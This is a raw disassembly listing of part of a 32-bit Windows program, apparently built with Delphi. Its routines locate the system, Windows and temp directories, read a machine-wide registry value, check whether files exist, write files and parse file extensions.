  405bfc:	64 ff 30             	push   %fs:(%eax)
  405bff:	64 89 20             	mov    %esp,%fs:(%eax)
  405c02:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405c05:	ba 44 5c 40 00       	mov    $0x405c44,%edx
  405c0a:	e8 49 bf ff ff       	call   0x401b58
  405c0f:	8b d3                	mov    %ebx,%edx
  405c11:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405c14:	e8 17 ff ff ff       	call   0x405b30
  405c19:	33 c0                	xor    %eax,%eax
  405c1b:	5a                   	pop    %edx
  405c1c:	59                   	pop    %ecx
  405c1d:	59                   	pop    %ecx
  405c1e:	64 89 10             	mov    %edx,%fs:(%eax)
  405c21:	68 36 5c 40 00       	push   $0x405c36
  405c26:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405c29:	e8 92 be ff ff       	call   0x401ac0
  405c2e:	c3                   	ret
  405c2f:	e9 d8 bb ff ff       	jmp    0x40180c
  405c34:	eb f0                	jmp    0x405c26
  405c36:	5b                   	pop    %ebx
  405c37:	59                   	pop    %ecx
  405c38:	5d                   	pop    %ebp
  405c39:	c3                   	ret
  405c3a:	00 00                	add    %al,(%eax)
  405c3c:	ff                   	(bad)
  405c3d:	ff                   	(bad)
  405c3e:	ff                   	(bad)
  405c3f:	ff 07                	incl   (%edi)
  405c41:	00 00                	add    %al,(%eax)
  405c43:	00 41 70             	add    %al,0x70(%ecx)
  405c46:	70 44                	jo     0x405c8c
  405c48:	61                   	popa
  405c49:	74 61                	je     0x405cac
  405c4b:	00 55 8b             	add    %dl,-0x75(%ebp)
  405c4e:	ec                   	in     (%dx),%al
  405c4f:	83 c4 f4             	add    $0xfffffff4,%esp
  405c52:	53                   	push   %ebx
  405c53:	56                   	push   %esi
  405c54:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405c57:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405c5a:	8b f0                	mov    %eax,%esi
  405c5c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405c5f:	e8 d4 c2 ff ff       	call   0x401f38
  405c64:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405c67:	e8 cc c2 ff ff       	call   0x401f38
  405c6c:	8b 45 08             	mov    0x8(%ebp),%eax
  405c6f:	e8 c4 c2 ff ff       	call   0x401f38
  405c74:	33 c0                	xor    %eax,%eax
  405c76:	55                   	push   %ebp
  405c77:	68 f1 5c 40 00       	push   $0x405cf1
  405c7c:	64 ff 30             	push   %fs:(%eax)
  405c7f:	64 89 20             	mov    %esp,%fs:(%eax)
  405c82:	33 db                	xor    %ebx,%ebx
  405c84:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405c87:	50                   	push   %eax
  405c88:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405c8b:	e8 b8 c2 ff ff       	call   0x401f48
  405c90:	50                   	push   %eax
  405c91:	56                   	push   %esi
  405c92:	e8 69 d8 ff ff       	call   0x403500
  405c97:	8b 45 08             	mov    0x8(%ebp),%eax
  405c9a:	e8 b1 c0 ff ff       	call   0x401d50
  405c9f:	50                   	push   %eax
  405ca0:	8b 45 08             	mov    0x8(%ebp),%eax
  405ca3:	e8 a0 c2 ff ff       	call   0x401f48
  405ca8:	50                   	push   %eax
  405ca9:	6a 02                	push   $0x2
  405cab:	6a 00                	push   $0x0
  405cad:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405cb0:	e8 93 c2 ff ff       	call   0x401f48
  405cb5:	50                   	push   %eax
  405cb6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405cb9:	50                   	push   %eax
  405cba:	e8 71 d8 ff ff       	call   0x403530
  405cbf:	85 c0                	test   %eax,%eax
  405cc1:	75 02                	jne    0x405cc5
  405cc3:	b3 01                	mov    $0x1,%bl
  405cc5:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405cc8:	50                   	push   %eax
  405cc9:	e8 2a d8 ff ff       	call   0x4034f8
  405cce:	33 c0                	xor    %eax,%eax
  405cd0:	5a                   	pop    %edx
  405cd1:	59                   	pop    %ecx
  405cd2:	59                   	pop    %ecx
  405cd3:	64 89 10             	mov    %edx,%fs:(%eax)
  405cd6:	68 f8 5c 40 00       	push   $0x405cf8
  405cdb:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405cde:	ba 02 00 00 00       	mov    $0x2,%edx
  405ce3:	e8 fc bd ff ff       	call   0x401ae4
  405ce8:	8d 45 08             	lea    0x8(%ebp),%eax
  405ceb:	e8 d0 bd ff ff       	call   0x401ac0
  405cf0:	c3                   	ret
  405cf1:	e9 16 bb ff ff       	jmp    0x40180c
  405cf6:	eb e3                	jmp    0x405cdb
  405cf8:	8b c3                	mov    %ebx,%eax
  405cfa:	5e                   	pop    %esi
  405cfb:	5b                   	pop    %ebx
  405cfc:	8b e5                	mov    %ebp,%esp
  405cfe:	5d                   	pop    %ebp
  405cff:	c2 04 00             	ret    $0x4
  405d02:	8b c0                	mov    %eax,%eax
  405d04:	55                   	push   %ebp
  405d05:	8b ec                	mov    %esp,%ebp
  405d07:	81 c4 bc fe ff ff    	add    $0xfffffebc,%esp
  405d0d:	53                   	push   %ebx
  405d0e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405d11:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405d14:	e8 1f c2 ff ff       	call   0x401f38
  405d19:	33 c0                	xor    %eax,%eax
  405d1b:	55                   	push   %ebp
  405d1c:	68 61 5d 40 00       	push   $0x405d61
  405d21:	64 ff 30             	push   %fs:(%eax)
  405d24:	64 89 20             	mov    %esp,%fs:(%eax)
  405d27:	33 db                	xor    %ebx,%ebx
  405d29:	8d 85 bc fe ff ff    	lea    -0x144(%ebp),%eax
  405d2f:	50                   	push   %eax
  405d30:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405d33:	e8 10 c2 ff ff       	call   0x401f48
  405d38:	50                   	push   %eax
  405d39:	e8 72 d8 ff ff       	call   0x4035b0
  405d3e:	83 f8 ff             	cmp    $0xffffffff,%eax
  405d41:	74 08                	je     0x405d4b
  405d43:	50                   	push   %eax
  405d44:	e8 5f d8 ff ff       	call   0x4035a8
  405d49:	b3 01                	mov    $0x1,%bl
  405d4b:	33 c0                	xor    %eax,%eax
  405d4d:	5a                   	pop    %edx
  405d4e:	59                   	pop    %ecx
  405d4f:	59                   	pop    %ecx
  405d50:	64 89 10             	mov    %edx,%fs:(%eax)
  405d53:	68 68 5d 40 00       	push   $0x405d68
  405d58:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405d5b:	e8 60 bd ff ff       	call   0x401ac0
  405d60:	c3                   	ret
  405d61:	e9 a6 ba ff ff       	jmp    0x40180c
  405d66:	eb f0                	jmp    0x405d58
  405d68:	8b c3                	mov    %ebx,%eax
  405d6a:	5b                   	pop    %ebx
  405d6b:	8b e5                	mov    %ebp,%esp
  405d6d:	5d                   	pop    %ebp
  405d6e:	c3                   	ret
  405d6f:	90                   	nop
  405d70:	55                   	push   %ebp
  405d71:	8b ec                	mov    %esp,%ebp
  405d73:	83 c4 f4             	add    $0xfffffff4,%esp
  405d76:	53                   	push   %ebx
  405d77:	56                   	push   %esi
  405d78:	8b f1                	mov    %ecx,%esi
  405d7a:	89 55 f8             	mov    %edx,-0x8(%ebp)
  405d7d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405d80:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405d83:	e8 b0 c1 ff ff       	call   0x401f38
  405d88:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405d8b:	e8 a8 c1 ff ff       	call   0x401f38
  405d90:	33 c0                	xor    %eax,%eax
  405d92:	55                   	push   %ebp
  405d93:	68 0a 5e 40 00       	push   $0x405e0a
  405d98:	64 ff 30             	push   %fs:(%eax)
  405d9b:	64 89 20             	mov    %esp,%fs:(%eax)
  405d9e:	6a 00                	push   $0x0
  405da0:	6a 00                	push   $0x0
  405da2:	6a 02                	push   $0x2
  405da4:	6a 00                	push   $0x0
  405da6:	6a 02                	push   $0x2
  405da8:	68 00 00 00 40       	push   $0x40000000
  405dad:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405db0:	e8 93 c1 ff ff       	call   0x401f48
  405db5:	50                   	push   %eax
  405db6:	e8 95 d7 ff ff       	call   0x403550
  405dbb:	8b d8                	mov    %eax,%ebx
  405dbd:	83 fb ff             	cmp    $0xffffffff,%ebx
  405dc0:	74 2d                	je     0x405def
  405dc2:	83 fe ff             	cmp    $0xffffffff,%esi
  405dc5:	75 0c                	jne    0x405dd3
  405dc7:	6a 00                	push   $0x0
  405dc9:	6a 00                	push   $0x0
  405dcb:	6a 00                	push   $0x0
  405dcd:	53                   	push   %ebx
  405dce:	e8 95 d8 ff ff       	call   0x403668
  405dd3:	6a 00                	push   $0x0
  405dd5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405dd8:	50                   	push   %eax
  405dd9:	56                   	push   %esi
  405dda:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405ddd:	e8 ba c1 ff ff       	call   0x401f9c
  405de2:	50                   	push   %eax
  405de3:	53                   	push   %ebx
  405de4:	e8 cf d8 ff ff       	call   0x4036b8
  405de9:	53                   	push   %ebx
  405dea:	e8 49 d7 ff ff       	call   0x403538
  405def:	33 c0                	xor    %eax,%eax
  405df1:	5a                   	pop    %edx
  405df2:	59                   	pop    %ecx
  405df3:	59                   	pop    %ecx
  405df4:	64 89 10             	mov    %edx,%fs:(%eax)
  405df7:	68 11 5e 40 00       	push   $0x405e11
  405dfc:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405dff:	ba 02 00 00 00       	mov    $0x2,%edx
  405e04:	e8 db bc ff ff       	call   0x401ae4
  405e09:	c3                   	ret
  405e0a:	e9 fd b9 ff ff       	jmp    0x40180c
  405e0f:	eb eb                	jmp    0x405dfc
  405e11:	5e                   	pop    %esi
  405e12:	5b                   	pop    %ebx
  405e13:	8b e5                	mov    %ebp,%esp
  405e15:	5d                   	pop    %ebp
  405e16:	c3                   	ret
  405e17:	90                   	nop
  405e18:	53                   	push   %ebx
  405e19:	56                   	push   %esi
  405e1a:	8b f2                	mov    %edx,%esi
  405e1c:	8b d8                	mov    %eax,%ebx
  405e1e:	68 3c 5e 40 00       	push   $0x405e3c
  405e23:	68 50 5e 40 00       	push   $0x405e50
  405e28:	e8 03 d8 ff ff       	call   0x403630
  405e2d:	50                   	push   %eax
  405e2e:	e8 dd d7 ff ff       	call   0x403610
  405e33:	56                   	push   %esi
  405e34:	53                   	push   %ebx
  405e35:	ff d0                	call   *%eax
  405e37:	5e                   	pop    %esi
  405e38:	5b                   	pop    %ebx
  405e39:	c3                   	ret
  405e3a:	00 00                	add    %al,(%eax)
  405e3c:	47                   	inc    %edi
  405e3d:	65 74 53             	gs je  0x405e93
  405e40:	79 73                	jns    0x405eb5
  405e42:	74 65                	je     0x405ea9
  405e44:	6d                   	insl   (%dx),%es:(%edi)
  405e45:	44                   	inc    %esp
  405e46:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  405e4d:	79 41                	jns    0x405e90
  405e4f:	00 6b 65             	add    %ch,0x65(%ebx)
  405e52:	72 6e                	jb     0x405ec2
  405e54:	65 6c                	gs insb (%dx),%es:(%edi)
  405e56:	33 32                	xor    (%edx),%esi
  405e58:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  405e5b:	6c                   	insb   (%dx),%es:(%edi)
  405e5c:	00 00                	add    %al,(%eax)
  405e5e:	00 00                	add    %al,(%eax)
  405e60:	53                   	push   %ebx
  405e61:	56                   	push   %esi
  405e62:	8b f2                	mov    %edx,%esi
  405e64:	8b d8                	mov    %eax,%ebx
  405e66:	68 84 5e 40 00       	push   $0x405e84
  405e6b:	68 9c 5e 40 00       	push   $0x405e9c
  405e70:	e8 bb d7 ff ff       	call   0x403630
  405e75:	50                   	push   %eax
  405e76:	e8 95 d7 ff ff       	call   0x403610
  405e7b:	56                   	push   %esi
  405e7c:	53                   	push   %ebx
  405e7d:	ff d0                	call   *%eax
  405e7f:	5e                   	pop    %esi
  405e80:	5b                   	pop    %ebx
  405e81:	c3                   	ret
  405e82:	00 00                	add    %al,(%eax)
  405e84:	47                   	inc    %edi
  405e85:	65 74 57             	gs je  0x405edf
  405e88:	69 6e 64 6f 77 73 44 	imul   $0x4473776f,0x64(%esi),%ebp
  405e8f:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  405e96:	79 41                	jns    0x405ed9
  405e98:	00 00                	add    %al,(%eax)
  405e9a:	00 00                	add    %al,(%eax)
  405e9c:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  405ea0:	65 6c                	gs insb (%dx),%es:(%edi)
  405ea2:	33 32                	xor    (%edx),%esi
  405ea4:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  405ea7:	6c                   	insb   (%dx),%es:(%edi)
  405ea8:	00 00                	add    %al,(%eax)
  405eaa:	00 00                	add    %al,(%eax)
  405eac:	53                   	push   %ebx
  405ead:	56                   	push   %esi
  405eae:	8b f2                	mov    %edx,%esi
  405eb0:	8b d8                	mov    %eax,%ebx
  405eb2:	68 d0 5e 40 00       	push   $0x405ed0
  405eb7:	68 e0 5e 40 00       	push   $0x405ee0
  405ebc:	e8 6f d7 ff ff       	call   0x403630
  405ec1:	50                   	push   %eax
  405ec2:	e8 49 d7 ff ff       	call   0x403610
  405ec7:	56                   	push   %esi
  405ec8:	53                   	push   %ebx
  405ec9:	ff d0                	call   *%eax
  405ecb:	5e                   	pop    %esi
  405ecc:	5b                   	pop    %ebx
  405ecd:	c3                   	ret
  405ece:	00 00                	add    %al,(%eax)
  405ed0:	47                   	inc    %edi
  405ed1:	65 74 54             	gs je  0x405f28
  405ed4:	65 6d                	gs insl (%dx),%es:(%edi)
  405ed6:	70 50                	jo     0x405f28
  405ed8:	61                   	popa
  405ed9:	74 68                	je     0x405f43
  405edb:	41                   	inc    %ecx
  405edc:	00 00                	add    %al,(%eax)
  405ede:	00 00                	add    %al,(%eax)
  405ee0:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  405ee4:	65 6c                	gs insb (%dx),%es:(%edi)
  405ee6:	33 32                	xor    (%edx),%esi
  405ee8:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  405eeb:	6c                   	insb   (%dx),%es:(%edi)
  405eec:	00 00                	add    %al,(%eax)
  405eee:	00 00                	add    %al,(%eax)
  405ef0:	55                   	push   %ebp
  405ef1:	8b ec                	mov    %esp,%ebp
  405ef3:	81 c4 f4 fe ff ff    	add    $0xfffffef4,%esp
  405ef9:	53                   	push   %ebx
  405efa:	33 d2                	xor    %edx,%edx
  405efc:	89 95 f4 fe ff ff    	mov    %edx,-0x10c(%ebp)
  405f02:	8b d8                	mov    %eax,%ebx
  405f04:	33 c0                	xor    %eax,%eax
  405f06:	55                   	push   %ebp
  405f07:	68 63 5f 40 00       	push   $0x405f63
  405f0c:	64 ff 30             	push   %fs:(%eax)
  405f0f:	64 89 20             	mov    %esp,%fs:(%eax)
  405f12:	8d 85 fb fe ff ff    	lea    -0x105(%ebp),%eax
  405f18:	ba 05 01 00 00       	mov    $0x105,%edx
  405f1d:	e8 f6 fe ff ff       	call   0x405e18
  405f22:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  405f28:	8d 95 fb fe ff ff    	lea    -0x105(%ebp),%edx
  405f2e:	b9 05 01 00 00       	mov    $0x105,%ecx
  405f33:	e8 ec bd ff ff       	call   0x401d24
  405f38:	8b 95 f4 fe ff ff    	mov    -0x10c(%ebp),%edx
  405f3e:	8b c3                	mov    %ebx,%eax
  405f40:	b9 78 5f 40 00       	mov    $0x405f78,%ecx
  405f45:	e8 52 be ff ff       	call   0x401d9c
  405f4a:	33 c0                	xor    %eax,%eax
  405f4c:	5a                   	pop    %edx
  405f4d:	59                   	pop    %ecx
  405f4e:	59                   	pop    %ecx
  405f4f:	64 89 10             	mov    %edx,%fs:(%eax)
  405f52:	68 6a 5f 40 00       	push   $0x405f6a
  405f57:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  405f5d:	e8 5e bb ff ff       	call   0x401ac0
  405f62:	c3                   	ret
  405f63:	e9 a4 b8 ff ff       	jmp    0x40180c
  405f68:	eb ed                	jmp    0x405f57
  405f6a:	5b                   	pop    %ebx
  405f6b:	8b e5                	mov    %ebp,%esp
  405f6d:	5d                   	pop    %ebp
  405f6e:	c3                   	ret
  405f6f:	00 ff                	add    %bh,%bh
  405f71:	ff                   	(bad)
  405f72:	ff                   	(bad)
  405f73:	ff 01                	incl   (%ecx)
  405f75:	00 00                	add    %al,(%eax)
  405f77:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  405f7b:	00 55 8b             	add    %dl,-0x75(%ebp)
  405f7e:	ec                   	in     (%dx),%al
  405f7f:	81 c4 f4 fe ff ff    	add    $0xfffffef4,%esp
  405f85:	53                   	push   %ebx
  405f86:	33 d2                	xor    %edx,%edx
  405f88:	89 95 f4 fe ff ff    	mov    %edx,-0x10c(%ebp)
  405f8e:	8b d8                	mov    %eax,%ebx
  405f90:	33 c0                	xor    %eax,%eax
  405f92:	55                   	push   %ebp
  405f93:	68 ef 5f 40 00       	push   $0x405fef
  405f98:	64 ff 30             	push   %fs:(%eax)
  405f9b:	64 89 20             	mov    %esp,%fs:(%eax)
  405f9e:	8d 85 fb fe ff ff    	lea    -0x105(%ebp),%eax
  405fa4:	ba 05 01 00 00       	mov    $0x105,%edx
  405fa9:	e8 b2 fe ff ff       	call   0x405e60
  405fae:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  405fb4:	8d 95 fb fe ff ff    	lea    -0x105(%ebp),%edx
  405fba:	b9 05 01 00 00       	mov    $0x105,%ecx
  405fbf:	e8 60 bd ff ff       	call   0x401d24
  405fc4:	8b 95 f4 fe ff ff    	mov    -0x10c(%ebp),%edx
  405fca:	8b c3                	mov    %ebx,%eax
  405fcc:	b9 04 60 40 00       	mov    $0x406004,%ecx
  405fd1:	e8 c6 bd ff ff       	call   0x401d9c
  405fd6:	33 c0                	xor    %eax,%eax
  405fd8:	5a                   	pop    %edx
  405fd9:	59                   	pop    %ecx
  405fda:	59                   	pop    %ecx
  405fdb:	64 89 10             	mov    %edx,%fs:(%eax)
  405fde:	68 f6 5f 40 00       	push   $0x405ff6
  405fe3:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  405fe9:	e8 d2 ba ff ff       	call   0x401ac0
  405fee:	c3                   	ret
  405fef:	e9 18 b8 ff ff       	jmp    0x40180c
  405ff4:	eb ed                	jmp    0x405fe3
  405ff6:	5b                   	pop    %ebx
  405ff7:	8b e5                	mov    %ebp,%esp
  405ff9:	5d                   	pop    %ebp
  405ffa:	c3                   	ret
  405ffb:	00 ff                	add    %bh,%bh
  405ffd:	ff                   	(bad)
  405ffe:	ff                   	(bad)
  405fff:	ff 01                	incl   (%ecx)
  406001:	00 00                	add    %al,(%eax)
  406003:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  406007:	00 53 81             	add    %dl,-0x7f(%ebx)
  40600a:	c4                   	(bad)
  40600b:	f8                   	clc
  40600c:	fe                   	(bad)
  40600d:	ff                   	(bad)
  40600e:	ff 8b d8 8b d4 b8    	decl   -0x472b7428(%ebx)
  406014:	05 01 00 00 e8       	add    $0xe8000001,%eax
  406019:	8f                   	(bad)
  40601a:	fe                   	(bad)
  40601b:	ff                   	(bad)
  40601c:	ff 8b c3 8b d4 b9    	decl   -0x462b743d(%ebx)
  406022:	05 01 00 00 e8       	add    $0xe8000001,%eax
  406027:	f9                   	stc
  406028:	bc ff ff 81 c4       	mov    $0xc481ffff,%esp
  40602d:	08 01                	or     %al,(%ecx)
  40602f:	00 00                	add    %al,(%eax)
  406031:	5b                   	pop    %ebx
  406032:	c3                   	ret
  406033:	90                   	nop
  406034:	55                   	push   %ebp
  406035:	8b ec                	mov    %esp,%ebp
  406037:	6a 00                	push   $0x0
  406039:	53                   	push   %ebx
  40603a:	8b d8                	mov    %eax,%ebx
  40603c:	33 c0                	xor    %eax,%eax
  40603e:	55                   	push   %ebp
  40603f:	68 7b 60 40 00       	push   $0x40607b
  406044:	64 ff 30             	push   %fs:(%eax)
  406047:	64 89 20             	mov    %esp,%fs:(%eax)
  40604a:	53                   	push   %ebx
  40604b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40604e:	e8 29 ff ff ff       	call   0x405f7c
  406053:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406056:	b9 03 00 00 00       	mov    $0x3,%ecx
  40605b:	ba 01 00 00 00       	mov    $0x1,%edx
  406060:	e8 3f bf ff ff       	call   0x401fa4
  406065:	33 c0                	xor    %eax,%eax
  406067:	5a                   	pop    %edx
  406068:	59                   	pop    %ecx
  406069:	59                   	pop    %ecx
  40606a:	64 89 10             	mov    %edx,%fs:(%eax)
  40606d:	68 82 60 40 00       	push   $0x406082
  406072:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406075:	e8 46 ba ff ff       	call   0x401ac0
  40607a:	c3                   	ret
  40607b:	e9 8c b7 ff ff       	jmp    0x40180c
  406080:	eb f0                	jmp    0x406072
  406082:	5b                   	pop    %ebx
  406083:	59                   	pop    %ecx
  406084:	5d                   	pop    %ebp
  406085:	c3                   	ret
  406086:	8b c0                	mov    %eax,%eax
  406088:	55                   	push   %ebp
  406089:	8b ec                	mov    %esp,%ebp
  40608b:	83 c4 ec             	add    $0xffffffec,%esp
  40608e:	53                   	push   %ebx
  40608f:	56                   	push   %esi
  406090:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406093:	89 55 fc             	mov    %edx,-0x4(%ebp)
  406096:	8b f0                	mov    %eax,%esi
  406098:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40609b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40609e:	e8 95 be ff ff       	call   0x401f38
  4060a3:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4060a6:	e8 8d be ff ff       	call   0x401f38
  4060ab:	8b 45 0c             	mov    0xc(%ebp),%eax
  4060ae:	e8 85 be ff ff       	call   0x401f38
  4060b3:	33 c0                	xor    %eax,%eax
  4060b5:	55                   	push   %ebp
  4060b6:	68 67 61 40 00       	push   $0x406167
  4060bb:	64 ff 30             	push   %fs:(%eax)
  4060be:	64 89 20             	mov    %esp,%fs:(%eax)
  4060c1:	8b c3                	mov    %ebx,%eax
  4060c3:	8b 55 0c             	mov    0xc(%ebp),%edx
  4060c6:	e8 49 ba ff ff       	call   0x401b14
  4060cb:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4060ce:	50                   	push   %eax
  4060cf:	6a 01                	push   $0x1
  4060d1:	6a 00                	push   $0x0
  4060d3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4060d6:	e8 6d be ff ff       	call   0x401f48
  4060db:	50                   	push   %eax
  4060dc:	56                   	push   %esi
  4060dd:	e8 3e d4 ff ff       	call   0x403520
  4060e2:	85 c0                	test   %eax,%eax
  4060e4:	75 5e                	jne    0x406144
  4060e6:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4060e9:	50                   	push   %eax
  4060ea:	6a 00                	push   $0x0
  4060ec:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4060ef:	50                   	push   %eax
  4060f0:	6a 00                	push   $0x0
  4060f2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4060f5:	e8 4e be ff ff       	call   0x401f48
  4060fa:	8b f0                	mov    %eax,%esi
  4060fc:	56                   	push   %esi
  4060fd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406100:	50                   	push   %eax
  406101:	e8 22 d4 ff ff       	call   0x403528
  406106:	85 c0                	test   %eax,%eax
  406108:	75 31                	jne    0x40613b
  40610a:	8b c3                	mov    %ebx,%eax
  40610c:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40610f:	e8 60 bf ff ff       	call   0x402074
  406114:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406117:	50                   	push   %eax
  406118:	8b 03                	mov    (%ebx),%eax
  40611a:	e8 29 be ff ff       	call   0x401f48
  40611f:	50                   	push   %eax
  406120:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406123:	50                   	push   %eax
  406124:	6a 00                	push   $0x0
  406126:	56                   	push   %esi
  406127:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40612a:	50                   	push   %eax
  40612b:	e8 f8 d3 ff ff       	call   0x403528
  406130:	8b 55 ec             	mov    -0x14(%ebp),%edx
  406133:	4a                   	dec    %edx
  406134:	8b c3                	mov    %ebx,%eax
  406136:	e8 39 bf ff ff       	call   0x402074
  40613b:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40613e:	50                   	push   %eax
  40613f:	e8 b4 d3 ff ff       	call   0x4034f8
  406144:	33 c0                	xor    %eax,%eax
  406146:	5a                   	pop    %edx
  406147:	59                   	pop    %ecx
  406148:	59                   	pop    %ecx
  406149:	64 89 10             	mov    %edx,%fs:(%eax)
  40614c:	68 6e 61 40 00       	push   $0x40616e
  406151:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406154:	ba 02 00 00 00       	mov    $0x2,%edx
  406159:	e8 86 b9 ff ff       	call   0x401ae4
  40615e:	8d 45 0c             	lea    0xc(%ebp),%eax
  406161:	e8 5a b9 ff ff       	call   0x401ac0
  406166:	c3                   	ret
  406167:	e9 a0 b6 ff ff       	jmp    0x40180c
  40616c:	eb e3                	jmp    0x406151
  40616e:	5e                   	pop    %esi
  40616f:	5b                   	pop    %ebx
  406170:	8b e5                	mov    %ebp,%esp
  406172:	5d                   	pop    %ebp
  406173:	c2 08 00             	ret    $0x8
  406176:	8b c0                	mov    %eax,%eax
  406178:	53                   	push   %ebx
  406179:	56                   	push   %esi
  40617a:	57                   	push   %edi
  40617b:	8b fa                	mov    %edx,%edi
  40617d:	8b f0                	mov    %eax,%esi
  40617f:	8b d6                	mov    %esi,%edx
  406181:	b8 d8 61 40 00       	mov    $0x4061d8,%eax
  406186:	e8 a1 be ff ff       	call   0x40202c
  40618b:	85 c0                	test   %eax,%eax
  40618d:	75 09                	jne    0x406198
  40618f:	8b c7                	mov    %edi,%eax
  406191:	e8 2a b9 ff ff       	call   0x401ac0
  406196:	eb 31                	jmp    0x4061c9
  406198:	8b c6                	mov    %esi,%eax
  40619a:	e8 b1 bb ff ff       	call   0x401d50
  40619f:	8b d8                	mov    %eax,%ebx
  4061a1:	83 fb 01             	cmp    $0x1,%ebx
  4061a4:	7c 23                	jl     0x4061c9
  4061a6:	8a 44 1e ff          	mov    -0x1(%esi,%ebx,1),%al
  4061aa:	3c 2e                	cmp    $0x2e,%al
  4061ac:	75 16                	jne    0x4061c4
  4061ae:	57                   	push   %edi
  4061af:	8b c6                	mov    %esi,%eax
  4061b1:	e8 9a bb ff ff       	call   0x401d50
  4061b6:	8b c8                	mov    %eax,%ecx
  4061b8:	8d 53 01             	lea    0x1(%ebx),%edx
  4061bb:	8b c6                	mov    %esi,%eax
  4061bd:	e8 e2 bd ff ff       	call   0x401fa4
  4061c2:	eb 05                	jmp    0x4061c9
  4061c4:	4b                   	dec    %ebx
  4061c5:	85 db                	test   %ebx,%ebx
  4061c7:	75 dd                	jne    0x4061a6
  4061c9:	5f                   	pop    %edi
  4061ca:	5e                   	pop    %esi
  4061cb:	5b                   	pop    %ebx
  4061cc:	c3                   	ret
  4061cd:	00 00                	add    %al,(%eax)
  4061cf:	00 ff                	add    %bh,%bh
  4061d1:	ff                   	(bad)
  4061d2:	ff                   	(bad)
  4061d3:	ff 01                	incl   (%ecx)
  4061d5:	00 00                	add    %al,(%eax)
  4061d7:	00 2e                	add    %ch,(%esi)
  4061d9:	00 00                	add    %al,(%eax)
  4061db:	00 55 8b             	add    %dl,-0x75(%ebp)
  4061de:	ec                   	in     (%dx),%al
  4061df:	6a 00                	push   $0x0
  4061e1:	6a 00                	push   $0x0
  4061e3:	53                   	push   %ebx
  4061e4:	8b d8                	mov    %eax,%ebx
  4061e6:	33 c0                	xor    %eax,%eax
  4061e8:	55                   	push   %ebp
  4061e9:	68 3c 62 40 00       	push   $0x40623c
  4061ee:	64 ff 30             	push   %fs:(%eax)
  4061f1:	64 89 20             	mov    %esp,%fs:(%eax)
  4061f4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4061f7:	ba 50 62 40 00       	mov    $0x406250,%edx
  4061fc:	e8 57 b9 ff ff       	call   0x401b58
  406201:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406204:	ba 84 62 40 00       	mov    $0x406284,%edx
  406209:	e8 4a b9 ff ff       	call   0x401b58
  40620e:	6a 00                	push   $0x0
  406210:	53                   	push   %ebx
  406211:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406214:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406217:	b8 02 00 00 80       	mov    $0x80000002,%eax
  40621c:	e8 67 fe ff ff       	call   0x406088
  406221:	33 c0                	xor    %eax,%eax
  406223:	5a                   	pop    %edx
  406224:	59                   	pop    %ecx
  406225:	59                   	pop    %ecx
  406226:	64 89 10             	mov    %edx,%fs:(%eax)
  406229:	68 43 62 40 00       	push   $0x406243
  40622e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406231:	ba 02 00 00 00       	mov    $0x2,%edx
  406236:	e8 a9 b8 ff ff       	call   0x401ae4
  40623b:	c3                   	ret
  40623c:	e9 cb b5 ff ff       	jmp    0x40180c
  406241:	eb eb                	jmp    0x40622e
  406243:	5b                   	pop    %ebx
  406244:	59                   	pop    %ecx
  406245:	59                   	pop    %ecx
  406246:	5d                   	pop    %ebp
  406247:	c3                   	ret
  406248:	ff                   	(bad)
